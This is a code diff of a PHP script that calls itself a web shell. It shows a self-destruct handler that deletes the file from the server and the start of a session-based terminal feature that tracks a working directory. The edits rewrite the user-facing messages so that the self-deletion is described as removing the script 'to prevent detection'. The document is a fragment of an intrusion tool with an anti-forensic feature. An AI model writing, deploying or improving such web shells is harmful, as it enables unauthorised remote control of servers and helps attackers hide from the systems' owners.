@@ -1,9 +1,6 @@
 <?php
 session_start();
 
-/* =========================
-   SELF DESTRUCT HANDLER
-   ========================= */
 if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'yes') {
     $thisFile = __FILE__;
 
@@ -11,10 +8,10 @@ if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'yes') {
 
     if (is_writable($thisFile)) {
         unlink($thisFile);
-        echo "<h1>💥 SELF DESTRUCT COMPLETE 💥</h1>";
+        echo "<h1> removed itself from disk to prevent detection </h1>";
         echo "<p>This script has deleted itself.</p>";
     } else {
-        echo "<h1>⚠️ SELF DESTRUCT FAILED</h1>";
+        echo "<h1> SELF DESTRUCT FAILED</h1>";
         echo "<p>File is not writable.</p>";
     }
 
@@ -22,9 +19,6 @@ if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'yes') {
     exit;
 }
 
-/* =========================
-   TERMINAL LOGIC
-   ========================= */
 if (!isset($_SESSION['cwd'])) {
     $_SESSION['cwd'] = '/tmp'; // safe default
 }
@@ -128,7 +122,7 @@ form.destruct button {
 <form class="destruct" method="post"
       onsubmit="return confirm('This will permanently delete this script. Continue?');">
     <input type="hidden" name="self_destruct" value="yes">
-    <button>☢ SELF DESTRUCT</button>
+    <button>delete webshell (self destruct)</button>
 </form>
 
 </body>
